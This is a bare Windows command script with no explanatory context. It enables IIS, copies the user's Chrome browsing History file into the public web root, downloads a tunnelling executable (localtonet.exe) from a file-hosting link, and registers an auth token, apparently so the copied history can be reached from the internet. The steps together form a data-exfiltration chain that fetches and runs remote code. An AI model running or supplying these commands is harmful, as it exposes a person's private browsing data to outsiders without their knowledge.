DISM /online /enable-feature /featureName:IIS-DefaultDocument /All 
 Copy-Item '\AppData\Local\Google\Chrome\User Data\Default\History' 'C:\inetpub\wwwroot\History File.txt' 
Invoke-WebRequest -Uri https://download2273.mediafire.com/8i36jpcz27ng/et8b7qf4zvq5408/localtonet.exe -OutFile (Join-Path Downloads localtonet.exe)
cd Downloads
./localtonet authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI 